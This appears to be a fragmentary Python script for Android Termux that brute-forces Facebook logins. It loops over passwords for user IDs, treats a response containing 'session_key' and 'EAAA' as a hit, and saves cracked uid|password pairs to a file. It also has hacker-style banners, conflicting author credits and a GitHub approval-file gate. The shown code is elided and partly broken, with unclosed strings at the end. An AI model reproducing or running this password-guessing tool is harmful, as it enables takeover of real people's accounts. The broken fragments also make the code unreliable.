...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR.NAYAN\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : MR.NAYAN \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook link   : https://github.com/nayanvau \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/nayanhasanmilon/approval.txt/blob/main/approval.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK : https://www.facebook.com/Zuckerberg.ekta.magir.pola")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/nayanhasanmilon/approval.txt/blob/main/approval.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : murad-king \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/nayanvau \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/Zuckerberg.ekta.magir.pola \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/Zuckerberg.ekta.magir.pola"])
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-murad-king]%s | %s\033[1;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-murad-king.txt","a").write(" %s|%s\n"%(uid, pw))
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print(" [*] Facebook  : https://www.facebook.com/Zuckerberg.ekta.magir.pola

		print(" [*] Instagram : https://instagram.com/ ")

		print(" [*] YouTube   : https://youtube.com/ ")

		exit(" [*] GitHub    : murad-king
